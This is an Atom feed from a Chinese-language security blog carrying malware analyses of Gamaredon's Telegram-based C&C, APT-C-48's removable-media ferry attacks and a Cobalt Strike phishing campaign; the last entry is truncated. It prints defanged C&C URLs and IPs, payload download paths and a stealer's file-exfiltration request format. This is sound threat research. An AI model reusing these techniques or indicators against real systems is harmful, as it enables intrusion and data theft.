<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ydc&#39;s Blog</title>
  
  
  <link href="http://shxi.cc/atom.xml" rel="self"/>
  
  <link href="http://shxi.cc/"/>
  <updated>2024-03-27T02:47:27.610Z</updated>
  <id>http://shxi.cc/</id>
  
  <author>
    <name>KenYang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Gamaredon滥用社交软件Telegram攻击乌克兰组织</title>
    <link href="http://shxi.cc/post/43274510.html"/>
    <id>http://shxi.cc/post/43274510.html</id>
    <published>2024-03-22T02:06:48.000Z</published>
    <updated>2024-03-27T02:47:27.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;Gamaredon是一个俄罗斯的APT攻击组织,首次出现于2013年，主要是针对乌克兰进行网络间谍活动。在Gamaredon最近的一次攻击活动中,发现该组织利用Telegram来提供C&amp;C服务器和payload下载地址。</p><h1 id="2-流程图"><a href="#2-流程图" class="headerlink" title="2.流程图"></a>2.流程图</h1> <img src="/post/43274510/d81a0d29bf4ffc44342615a7e6a368f5.png" class="" title="example"><span id="more"></span><h1 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h1><h2 id="1-钓鱼邮件分析"><a href="#1-钓鱼邮件分析" class="headerlink" title="1.钓鱼邮件分析"></a>1.钓鱼邮件分析</h2><p>&emsp;&emsp;攻击者使用鱼叉式电子邮件钓鱼方式将包含由远程模板钓鱼漏洞的电子邮件发送给受害者。<br><img src="43274510/98028e5eba059c82b81acd286d22f0a8.png"></p><p>当受害者打开电子邮件中的附件文档时, 或从服务器中下载包含恶意宏代码的文档。<br><img src="43274510/0e5fff91e27f96a7ac8f41e225145a59.png"></p><p>&emsp;&emsp;在此次攻击中,远程模板使用的链接与Gamaredon在以往的攻击活动中使用的模板链接很相似,都包含字符”WIN-HP59CQH9A1H”,模板文件名使用”wft”作为后缀名, 该组织以往攻击活动中使用过的模板链接如下:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hxxp:<span class="regexp">//</span>pretend.goal6.koportas.ru<span class="regexp">/WIN-HP59CQH9A1H/</span>count/almost.wft</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;恶意文档从远程服务器成功加载恶意模板文件后,在文档被关闭时开始执行恶意宏代码中的函数Document_Close。</p><p>&emsp;&emsp;宏代码使用的字符串混淆方式较为简单,就是将代码中的一些字符使用其他的无效字符来替换，在使用之前再将这些字符替换回来。使用方法CodeModule.AddFromString将去混淆后的字符串作为代码块添加到宏模块中。<br><img src="43274510/068f00d8436441cd16a6757db3066bf4.png"></p><p>方法PRESENT10599为前面添加到宏模块中的代码块中定义的方法,主要功能为将base64数据写入到文件中。<br><img src="43274510/f34602b2fc5642e805eb72a3fc3807b4.png"></p><h2 id="2-stage1-混淆VBS脚本"><a href="#2-stage1-混淆VBS脚本" class="headerlink" title="2.stage1 混淆VBS脚本"></a>2.stage1 混淆VBS脚本</h2><p>&emsp;&emsp;判断”%USERPROFILE%\Downloads\bars”是否存在, 如果不存在则创建该目录,fogm4为该方法的参数, 值为base64后的数据,在该方法内将解码后写入文件decrepit，然后通过创建计划任务的方式在执行该文件。<br><img src="43274510/87300b7c2d33db9ae3c2f80c41af7b07.png"></p><p>在计划任务创建成功后, 通过将宏代码从文档中移除来清除操作痕迹以避免被发现。<br><img src="43274510/6cf35e6f8a8830ccbcb2549082e3f8b0.png"></p><p>&emsp;&emsp;计划任务创建代码如下图，使用的计划任务名为”Synchronize-Time-US”,在当前时间7秒后触发计划任务,执行的间隔时间为5分钟,通过程序wscript来执行vbs脚本。<br><img src="43274510/9afa4fb6f3956baa2059bdfe8f1b3eaf.png"></p><h2 id="3-stage2-混淆VBS脚本"><a href="#3-stage2-混淆VBS脚本" class="headerlink" title="3.stage2 混淆VBS脚本"></a>3.stage2 混淆VBS脚本</h2><p>&emsp;&emsp;该阶段的vbs脚本由stage1中的base64编码的数据解码后写入文件并通过计划任务执行，主要功能为解密下一阶段的vbs脚本并执行。使用的混淆方法与前面类似, 最后通过Execute执行解密后的VBS脚本。<br><img src="43274510/2d2127b8a856160d1fb09b3822a8aafb.png"></p><h2 id="4-stage3-混淆vbs脚本"><a href="#4-stage3-混淆vbs脚本" class="headerlink" title="4.stage3 混淆vbs脚本"></a>4.stage3 混淆vbs脚本</h2><p>&emsp;&emsp;该阶段vbs脚本主要功能为获取C&amp;C地址以及从C&amp;C下载恶意程序。攻击者使用两种方式来获取C&amp;C地址。</p><h3 id="1-C-amp-C地址获取"><a href="#1-C-amp-C地址获取" class="headerlink" title="1.C&amp;C地址获取"></a>1.C&amp;C地址获取</h3><p>访问链接”hxxps://t.me/s/zacreq”, 并使用正则表达式提取对应的IP地址。<br><img src="43274510/702d2a41bb83c032cea6684236561f71.png"></p><p>提取IP地址代码如下,主要是通过正则匹配提取两个”==”之间的内容并将字符”@”替换成”.”,替换后的数据为标准的点分式IP地址。<br><img src="43274510/a9bb0bad234c035c1100bcb8c48052ad.png"></p><p>如果从Telegram 中获取到的字符长度小于5,则使用decrepit.mexv.ru的IP地址作为C&amp;C服务器。</p><p><img src="43274510/5ad5421b1589bcec8d8979bb94f73298.png"></p><h3 id="2-下载payload"><a href="#2-下载payload" class="headerlink" title="2.下载payload"></a>2.下载payload</h3><p>恶意脚本使用Get请求从服务器上下载下一阶段的payload，请求的链接为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Hxxp</span><span class="symbol">://</span>&#123;c&amp;c&#125;/decrepit&#123;<span class="number">0</span>到<span class="number">100</span>的随机数&#125;/bars.x=<span class="string">?d</span>evice</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在请求头的user_gent字段附加用于标识受害者的标识符，请求头的host被设置为”mirZ62178.net”等等，攻击者可能会请求头的数据进行校验，如果不符合则返回错误的数据或者访问失败，这样可以避免分析者通过直接访问网页来获取下一阶段payload并进行分析。<br><img src="43274510/efa52d3438323d4d78021bd6e92e645e.png"></p><p>&emsp;&emsp;在分析过程中由于C&amp;C服务器没有下发payload, 无法继续分析payload。但从后续的代码中可以得知返回的payload为base64编码的vbs脚本。<br><img src="43274510/1b0db12b597457b2d5d08369a53eb8fe.png"></p><h2 id="5-InfoStealer"><a href="#5-InfoStealer" class="headerlink" title="5.InfoStealer"></a>5.InfoStealer</h2><p>攻击者最终投递到受害者的恶意程序为InfoStealer，主要为从受害者机器窃取重要数据。</p><h3 id="1-创建互斥量"><a href="#1-创建互斥量" class="headerlink" title="1.创建互斥量"></a>1.创建互斥量</h3><p>恶意程序在执行时创建互斥量并通过错误码来判断是否已经由实例在运行，避免程序重复运行。<br><img src="43274510/43c58c080d59b399323a9f669c471303.png"></p><h3 id="2-C-amp-C地址获取"><a href="#2-C-amp-C地址获取" class="headerlink" title="2.C&amp;C地址获取"></a>2.C&amp;C地址获取</h3><p>随机生成一个12位的字母, 并将其作为域名”celticso.ru”的子域名部分。<br><img src="43274510/539aa9b4a4dd4ed1ac12c2d2cde02e34.png"></p><h3 id="2-文件窃取"><a href="#2-文件窃取" class="headerlink" title="2.文件窃取"></a>2.文件窃取</h3><h4 id="1-窃取的文件类型"><a href="#1-窃取的文件类型" class="headerlink" title="1.窃取的文件类型"></a>1.窃取的文件类型</h4><p>&emsp;&emsp;递归遍历指定目录下的所有文件或文件夹,如果遍历到的文件类型位目录，则判断是否包含特定的字符串,如果是则继续递归遍历文件夹。</p><p><img src="43274510/89ac1a202c35d20daa9c51df628a6908.png"></p><p>这些字符串如下:<br><img src="43274510/fe3d01743f7bdd8058b12ea542173b57.png"></p><p>如果是文件则首先判断文件名是否包含”.”然后检测文件后缀名和判断文件是否为空，对于每个符合条件的文件由函数参数callback进行处理。<br><img src="43274510/bcf7f5386eafb8a5583e3ac6be82f86c.png"></p><p>检测的所有后缀名如下:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Doc docx xls rtf odt txt <span class="keyword">jpg </span><span class="keyword">jpeg </span>pdf ps1 rar zip <span class="number">7</span>z mdb</span><br></pre></td></tr></table></figure><h4 id="2-收集所有磁盘指定类型文件"><a href="#2-收集所有磁盘指定类型文件" class="headerlink" title="2.收集所有磁盘指定类型文件"></a>2.收集所有磁盘指定类型文件</h4><p>枚举所有磁盘驱动器和网络磁盘并遍历所在磁盘下的所有目录找到符合条件的文件。如果磁盘驱动器位C盘,则只遍历目录”C:\\Users”下的目录。<img src="43274510/7506bde440ef50d28db1595ca3ca88a5.png"></p><p>&emsp;&emsp;恶意程序使用文件”**%appdata%/profiles_c.ini**”来标记文件是否已上传,此文件保存了多个文件的文件信息的md5, 每0x10大小的数据对应一个文件信息的md5值,文件信息使用如下格式拼接:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;文件名&#125;</span><span class="template-variable">&#123;文件大小&#125;</span><span class="template-variable">&#123;文件创建时间&#125;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在需要上传文件时,读取<strong>profiles_c.ini</strong>数据来判断当前文件是否已经被上传，如果已经上传则不需要做任何操作;如果当前文件没有上传则上传并写入md5到文件<strong>profiles_c.ini</strong>。</p><p><img src="43274510/fdb15848df9a39eae76d62edc760382e.png"></p><h4 id="3-收集可移动设备指定类型数据"><a href="#3-收集可移动设备指定类型数据" class="headerlink" title="3.收集可移动设备指定类型数据"></a>3.收集可移动设备指定类型数据</h4><p>&emsp;&emsp;遍历所有磁盘驱动器并判断是否是可移动设备,如果是则将符合条件的文件拷贝到临时目录中专门存放从可移动设备收集的文件的目录.目录名为12位随机字母, 拷贝成功后<br><img src="43274510/b9a515ae80dccd7e349cbda8b4fe317a.png"></p><p>窃取的文件存放的路径规格如下:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">%temp%\</span><span class="template-variable">&#123;12位随机字母&#125;</span><span class="language-xml">\connect\</span><span class="template-variable">&#123;可移动设备的序列号&#125;</span><span class="language-xml">\</span><span class="template-variable">&#123;文件的原始路径&#125;</span></span><br></pre></td></tr></table></figure><p>以路径”e:\topsec\job.docx”为例, 则将其拷贝到路径:</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">%temp</span>%\&#123;<span class="number">12</span>位随机字母&#125;\connect\&#123;可移动设备的序列号&#125;\topsec\<span class="keyword">job</span>.docx</span><br></pre></td></tr></table></figure><p><img src="43274510/92adabc9c5cf5cd8b89cae05e9c83fc6.png" alt="文本 描述已自动生成"></p><h4 id="4-上传临时目录指定类型文件"><a href="#4-上传临时目录指定类型文件" class="headerlink" title="4.上传临时目录指定类型文件"></a>4.上传临时目录指定类型文件</h4><p>&emsp;&emsp;恶意程序在目录”%temp%”创建了一个以12位随机字母作为文件名的目录,用于存放所有从可移动设备窃取的文件,当需要上传数据时从该目录遍历所有符合条件的文件并上传到C&amp;C服务器。</p><p>获取受害者的用户名、计算机名和C盘序列号，并以如下格式拼接并作为机器标识符machine_info。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;计算机名&#125;</span><span class="language-xml">||</span><span class="template-variable">&#123;用户名&#125;</span><span class="language-xml">||</span><span class="template-variable">&#123;12位随机字符串&#125;</span><span class="language-xml">||</span><span class="template-variable">&#123;c盘序列号&#125;</span></span><br></pre></td></tr></table></figure><p>对于每个文件,获取其文件名、文件修改时间和文件大小并按如下格式拼接成包含文件信息的字符串file_info。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;固定值6000&#125;</span><span class="language-xml">&amp;&amp;</span><span class="template-variable">&#123;文件名&#125;</span><span class="language-xml">&amp;&amp;</span><span class="template-variable">&#123;文件修改时间&#125;</span><span class="language-xml">&amp;&amp;</span><span class="template-variable">&#123;文件大小&#125;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;将machine_info和file_info以”{machine_info}&amp;&amp;__&amp;&amp;{file_info}”的形式拼接并base64编码后作为文件上传请求头的一部分。恶意程序使用”multipart/form-data”类型上传文件数据, 使用的请求头格式如下:</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">------</span>&#123;<span class="number">12</span>位随机值&#125;\r\n</span><br><span class="line"><span class="type">Content</span><span class="operator">-</span><span class="type">Disposition</span>: form<span class="operator">-</span>data; name<span class="operator">=</span>\<span class="string">&quot;p<span class="subst">\&quot;</span><span class="subst">\r</span><span class="subst">\n</span></span></span><br><span class="line"><span class="string"><span class="subst">\r</span><span class="subst">\n</span></span></span><br><span class="line"><span class="string">&#123;base64编码的文件信息&#125;<span class="subst">\r</span><span class="subst">\n</span></span></span><br><span class="line"><span class="string">------%s<span class="subst">\r</span><span class="subst">\n</span></span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=<span class="subst">\&quot;</span>file<span class="subst">\&quot;</span>; filename=<span class="subst">\&quot;</span>&#123;文件名&#125;<span class="subst">\&quot;</span><span class="subst">\r</span><span class="subst">\n</span></span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream<span class="subst">\r</span><span class="subst">\n</span></span></span><br><span class="line"><span class="string">Content-Transfer-Encoding: binary<span class="subst">\r</span><span class="subst">\n</span></span></span><br><span class="line"><span class="string"><span class="subst">\r</span><span class="subst">\n</span></span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如果文件上传到C&amp;C服务器成功后，如果C&amp;C服务器返回数据则解析C&amp;C指令并执行，最后还会将上传成功的文件删除。</p><h3 id="3-执行C-amp-C指令"><a href="#3-执行C-amp-C指令" class="headerlink" title="3.执行C&amp;C指令"></a>3.执行C&amp;C指令</h3><p>&emsp;&emsp;首先从远程服务器接收0x14大小的数据并解析相关结构，具体结构如下:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Struct</span> <span class="type">packet</span>&#123;</span><br><span class="line">Uint32_t buf_size;<span class="comment">//文件大小</span></span><br><span class="line">Uint32_t block_size;<span class="comment">//每次读取的文件分块大小</span></span><br><span class="line">Uint16_t <span class="built_in">type</span>;<span class="comment">//要执行的操作。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;当type为1表示文件为可执行文件,为2时表示为vbs脚本文件，如果为其他值则为二进制数据。<br>&emsp;&emsp;恶意程序将下载的数据保存到目录”%temp%”,文件名为12位的随机字母,并根据type的不同来设置文件后缀和如何执行文件。</p><p><img src="43274510/9943892eba6a7444b9d8b6e1c83ee09c.png"></p><h1 id="3-ATT-amp-CK矩阵"><a href="#3-ATT-amp-CK矩阵" class="headerlink" title="3.ATT&amp;CK矩阵"></a>3.ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Execution</td><td>T1559.001</td><td>Inter-Process Communication</td><td>加载远程模板</td></tr><tr><td></td><td>T1059</td><td>Command and Scripting</td><td>执行powershell脚本</td></tr><tr><td>Command and Control</td><td>T1102.002</td><td>Web Service： Bidirectional Communication</td><td>利用公共服务Telegram获取C&amp;C地址</td></tr><tr><td></td><td>T1105</td><td>Ingress Tool Transfer</td><td>下载恶意脚本和恶意程序</td></tr><tr><td></td><td>T1008</td><td>Fallback Channels</td><td>恶意程序准备了多个C&amp;C地址</td></tr><tr><td></td><td>T1071</td><td>Application Layer Protocol</td><td>使用HTTP协议进行通信</td></tr><tr><td>Exfiltration</td><td>T1029</td><td>Scheduled Transfer</td><td>每隔一段时间上传文件</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;Gamaredon是一个俄罗斯的APT攻击组织,首次出现于2013年，主要是针对乌克兰进行网络间谍活动。在Gamaredon最近的一次攻击活动中,发现该组织利用Telegram来提供C&amp;amp;C服务器和payload下载地址。&lt;/p&gt;
&lt;h1 id=&quot;2-流程图&quot;&gt;&lt;a href=&quot;#2-流程图&quot; class=&quot;headerlink&quot; title=&quot;2.流程图&quot;&gt;&lt;/a&gt;2.流程图&lt;/h1&gt; &lt;img src=&quot;/post/43274510/d81a0d29bf4ffc44342615a7e6a368f5.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    
    <category term="Gamaredon" scheme="http://shxi.cc/tags/Gamaredon/"/>
    
  </entry>
  
  <entry>
    <title>APT-C-48(CNC)组织针利用摆渡攻击对军工和教育行业进行攻击</title>
    <link href="http://shxi.cc/post/445e503c.html"/>
    <id>http://shxi.cc/post/445e503c.html</id>
    <published>2024-03-21T01:56:49.000Z</published>
    <updated>2024-03-21T02:34:10.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;第一次发现APT-C-48的攻击在2019年，由于其武器库中的远程控制木马的的PDB名包含字符”cnc_client”,因此将其命名为CNC。<br>&emsp;&emsp;该组织主要攻击对象为我国的的军工和教育行业，在我国疫情爆发初期,该组织就通过伪造疫情相关的文档以及钓鱼网站对医疗行业发起攻击。摆渡攻击是利用移动设备作为渡船,间接从与互联网物理隔离的内部网络窃取数据的一种攻击手段。</p><h1 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h1><h2 id="PrivateImage-png-exe分析"><a href="#PrivateImage-png-exe分析" class="headerlink" title="PrivateImage.png.exe分析"></a>PrivateImage.png.exe分析</h2><h3 id="1-检测自身路径"><a href="#1-检测自身路径" class="headerlink" title="1.检测自身路径"></a>1.检测自身路径</h3><p>&emsp;&emsp;使用函数GetModuleFileNameA获取恶意程序所在路径，并将路径所有字符转换成小写判断转换后的字符串是否包含字符”appdata\\local”。</p><img src="/post/445e503c/78738e05937d05cf268e1c5050e65feb.png" class="" title="example"><span id="more"></span><p>&emsp;&emsp;如果路径中不包含”appdata\\local”则从文件的资源中释放图片并打开。<br><img src="445e503c/e6e987aad7cc715a41763234940bcc21.png"></p><p>&emsp;&emsp;打开的内容如下，为一张新年祝福的图片。<br><img src="445e503c/5c8721e2963f2cc3538061bc3d9f3bda.png"></p><h3 id="2-检测是否插入新移动设备"><a href="#2-检测是否插入新移动设备" class="headerlink" title="2.检测是否插入新移动设备"></a>2.检测是否插入新移动设备</h3><p>&emsp;&emsp;如果恶意程序运行在%localappdata%,每隔60秒检测一次是否有新设备插入。检测方式为使用函数GetLogicalDriveStringsA获取当前机器上所有存在的驱动器，然后比较两次获取到的驱动器来判断是否有新设备插入。</p><p><img src="445e503c/96db8eed4e305f448dbcc584d0e2ad54.png"></p><p>&emsp;&emsp;如果检测到新设备插入,首先判断受害者机器上是否存在文件”PrivateImage.png.exe”文件，如果没有存在表示恶意程序在该机器上时第一次运行，拼接字符串”{用户名}-firstcry”，如果存在则拼接字符串”{用户名}-alleat”。</p><p><img src="445e503c/3ca99eb085181d835b5a72bacdc16eca.png"></p><p>&emsp;&emsp;然后将前面拼接的字符串附加到C&amp;C服务器地址后面然后函数URLDownloadToFileW间接实现HTTPGET请求。</p><p><img src="445e503c/3672a2d3be78ff55ad66db5660af4c87.png"></p><h3 id="3-检测执行环境是否能够联网"><a href="#3-检测执行环境是否能够联网" class="headerlink" title="3.检测执行环境是否能够联网"></a>3.检测执行环境是否能够联网</h3><p>&emsp;&emsp;恶意程序首先判断文件ImageEditor.exe是否存在, 如果不存在则退出程序。<br>&emsp;&emsp;如果存在则访问网站<strong>hxxp://<a href="http://www.baidu.com/">www.baidu.com</a></strong>判断网络是否能够联通,如果不能连通则从受害者某个目录拷贝”.pdf”、”.pptx”等后缀的文档到移动设备上,<br>当该移动设备在能够联网的电脑上连接时将收集到的数据上传，否则执行payload下载功能。<br><img src="445e503c/9137a3bd43014041ade5b84a4b8e0888.png"></p><h3 id="4-窃取文档数据"><a href="#4-窃取文档数据" class="headerlink" title="4.窃取文档数据"></a>4.窃取文档数据</h3><p>&emsp;&emsp;受害者机器不能联网时实现文档窃取功能，恶意程序首先在受害者机器的Recent目录下以用户名为名在恶意程序所在的目录下创建一个隐藏目录。<br><img src="445e503c/0e543b04e8dd9558d3e022fd00c1a5ec.png"></p><p>&emsp;&emsp;恶意程序使用函数FindFirstFileW和FindNextFileW来收集指定目录下所有后缀名为”.docx”和”.pptx”的文档数据的快捷方式，该路径名为</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\\</span>Users<span class="symbol">\\</span>AppData<span class="symbol">\\</span>Roaming<span class="symbol">\\</span>Microsoft<span class="symbol">\\</span>Windows<span class="symbol">\\</span>Recent</span><br></pre></td></tr></table></figure><p><img src="445e503c/6279a2a1c8ee181db4adb9a9a650164f.png"></p><p>&emsp;&emsp;收集完成后将其拷贝到刚创建的隐藏文件中。</p><p><img src="445e503c/d95f88661e3ae630d04a885e7d076187.png"></p><h3 id="5-Payload下载"><a href="#5-Payload下载" class="headerlink" title="5.Payload下载"></a>5.Payload下载</h3><p>&emsp;&emsp;恶意程序首先检测是否存在目录”C:\\ProgramData\\USFshared”,如果不存在则创建目录。该目录主要由于存放下载的payload文件。</p><p><img src="445e503c/ae0962de71c23c48e6c2de48901645a7.png"></p><p>&emsp;&emsp;从链接”185.25.51.41/control/utility/YodaoCloudMgr”下载payload保存到临时目录，文件名为”YodaoCloundMgr.exe”。</p><p><img src="445e503c/801cb0971c5d9e2b5be04256c7049e04.png"></p><p>&emsp;&emsp;创建的计划任务如下:</p><p><img src="445e503c/4232e7d71c77aab4b38800d9a63d234f.png"></p><p>执行结果使用如下字符串来表示。</p><table><thead><tr><th>状态字符串</th><th>描述</th></tr></thead><tbody><tr><td>23Fi45XX</td><td>下载成功</td></tr><tr><td>23Fi45NNXX</td><td>下载失败</td></tr><tr><td>45tDdd43543</td><td>任务计划创建成功</td></tr><tr><td>45tDnn43543</td><td>任务计划创建失败</td></tr></tbody></table><h3 id="6-收集进程"><a href="#6-收集进程" class="headerlink" title="6.收集进程"></a>6.收集进程</h3><p>&emsp;&emsp;使用函数WTSEnumerateProcessesW遍历当前所有正在运行的进程。并将所有进程名拼接后使用base64编码。</p><p><img src="445e503c/a5765e50d9b3cca1ce7b569fa57debd7.png"></p><h3 id="7-执行payload"><a href="#7-执行payload" class="headerlink" title="7.执行payload"></a>7.执行payload</h3><p>&emsp;&emsp;恶意程序通过URLDOwnloadToFileW将执行结果回传给C&amp;C服务器,如果计划任务创建失败则通过创建进程的方式执行下载的payload。</p><p><img src="445e503c/9f3398541330d76a5da31c6fab89e849.png"></p><p>&emsp;&emsp;如果使用CreateProcessA执行进程失败则从github上下载payload并执行。</p><p><img src="445e503c/1557b278fd2e61ca4a0ddd66c9d4ca21.png"></p><h1 id="4-ATT-amp-CK矩阵"><a href="#4-ATT-amp-CK矩阵" class="headerlink" title="4.ATT&amp;CK矩阵"></a>4.ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Execution</td><td>T1204</td><td>User Execution</td><td>诱导用户执行</td></tr><tr><td></td><td>T1053</td><td>Scheduled Task/Job</td><td>创建计划任务启动</td></tr><tr><td>Discovery</td><td>T1057</td><td>Process Discovery</td><td>遍历所有正在运行的进程</td></tr><tr><td></td><td>T1083</td><td>File and Directory Discovery</td><td>窃取指定后缀的文件</td></tr><tr><td></td><td>T1124</td><td>System Time Discovery</td><td>获取本地时间</td></tr><tr><td>Command and Control</td><td>T1071</td><td>Application Layer Protocol</td><td>使用http协议通信</td></tr><tr><td></td><td>T1132</td><td>Data Encoding</td><td>回传的部分数据使用base64编码</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;第一次发现APT-C-48的攻击在2019年，由于其武器库中的远程控制木马的的PDB名包含字符”cnc_client”,因此将其命名为CNC。&lt;br&gt;&amp;emsp;&amp;emsp;该组织主要攻击对象为我国的的军工和教育行业，在我国疫情爆发初期,该组织就通过伪造疫情相关的文档以及钓鱼网站对医疗行业发起攻击。摆渡攻击是利用移动设备作为渡船,间接从与互联网物理隔离的内部网络窃取数据的一种攻击手段。&lt;/p&gt;
&lt;h1 id=&quot;2-详细分析&quot;&gt;&lt;a href=&quot;#2-详细分析&quot; class=&quot;headerlink&quot; title=&quot;2. 详细分析&quot;&gt;&lt;/a&gt;2. 详细分析&lt;/h1&gt;&lt;h2 id=&quot;PrivateImage-png-exe分析&quot;&gt;&lt;a href=&quot;#PrivateImage-png-exe分析&quot; class=&quot;headerlink&quot; title=&quot;PrivateImage.png.exe分析&quot;&gt;&lt;/a&gt;PrivateImage.png.exe分析&lt;/h2&gt;&lt;h3 id=&quot;1-检测自身路径&quot;&gt;&lt;a href=&quot;#1-检测自身路径&quot; class=&quot;headerlink&quot; title=&quot;1.检测自身路径&quot;&gt;&lt;/a&gt;1.检测自身路径&lt;/h3&gt;&lt;p&gt;&amp;emsp;&amp;emsp;使用函数GetModuleFileNameA获取恶意程序所在路径，并将路径所有字符转换成小写判断转换后的字符串是否包含字符”appdata&#92;&#92;local”。&lt;/p&gt;
&lt;img src=&quot;/post/445e503c/78738e05937d05cf268e1c5050e65feb.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>攻击者利用美国政府承包商和PSA plus的工作机会投递Cobalt Strike beacons</title>
    <link href="http://shxi.cc/post/54e506a9.html"/>
    <id>http://shxi.cc/post/54e506a9.html</id>
    <published>2024-03-21T01:43:05.000Z</published>
    <updated>2024-03-27T02:48:38.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;最近发现一个恶意活动,该活动使用模块化攻击技术并投递CobaltStrike木马到受害者机器上。攻击者通过携带CVE-2017-0199漏洞的钓鱼邮件，当受害者打开钓鱼邮件时,它会下载托管再攻击者控制的恶意Word文档模板。</p><p>&emsp;&emsp;在此次活动中发现了攻击者使用的两种攻击方法,一种时通过远程模板执行嵌入的VBS脚本,从而导致生成和执行其他混淆的VB和Powershell混淆脚本。另一种使用恶意宏代码下载和执行恶意powershell命令和下载恶意程序。</p><p>&emsp;&emsp;两种攻击最终都投递CobaltStrike的泄露版本。Bean配置包含执行任意二进制文件和进程注入，并配置了高信誉，使用重定向技术来伪装Beaons的流量。在投递CobaltStrike的同时还投递了其他窃密软件。</p><span id="more"></span><h1 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h1><h2 id="1-PSA-Plus招聘信息主题钓鱼"><a href="#1-PSA-Plus招聘信息主题钓鱼" class="headerlink" title="1. PSA Plus招聘信息主题钓鱼"></a>1. PSA Plus招聘信息主题钓鱼</h2><h3 id="1-accounting-docx"><a href="#1-accounting-docx" class="headerlink" title="1.accounting.docx"></a>1.accounting.docx</h3><p>&emsp;&emsp;该文件包含CVE-2017-0199远程模板调用漏洞，当受害者打开文档时会从公共服务器下载远程模板然后执行恶意宏代码。由于远程模板中包含恶意宏代码，需要启动宏功能，因此在文档被打开时首先显示的是提示受害者启用宏功能来确保恶意宏顺利执行。</p><p><img src="54e506a9/4152b1fb897b93e5c3f88c77a4b2f7aa.png"></p><p>&emsp;&emsp;文档伪装成新西兰著名工会新西兰惠灵顿公共服务协会办公室招聘信息的欺诈性文件。招聘的岗位主要为发展授权、PSA<br>Plus和对秘书处的行政支持。<br><img src="54e506a9/e6e0baf2ac44e9fd07172f93b591917e.png"></p><p>&emsp;&emsp;PSA New Zealand曾经在2022年4月份发布了真实的职位描述popup_icon，从文档元数据信息可以看出攻击者在2022年5月6号创建了包含远程恶意模板的基础文件，并在基础文件上创建包含不同主题的恶意文档。该文件最后修改时间为2022年8月3月，也就是攻击者开始谋划这次攻击行动的开始事件。</p><p>&emsp;&emsp;该文档内容与PSA New Zealand发布的文件内容很相似，说明攻击者也是经常关注社会上的热点新闻，并以此为主题创建诱饵文档攻击特定人士。<br><img src="54e506a9/34a8801b88544c605c5438bced79d4b6.png"></p><h3 id="1-流程图"><a href="#1-流程图" class="headerlink" title="1.流程图"></a>1.流程图</h3><p><img src="54e506a9/1e977681fc29d6a23bf1374edeb298d4.png"></p><h3 id="2-Stage2-远程模板"><a href="#2-Stage2-远程模板" class="headerlink" title="2.Stage2 远程模板"></a>2.Stage2 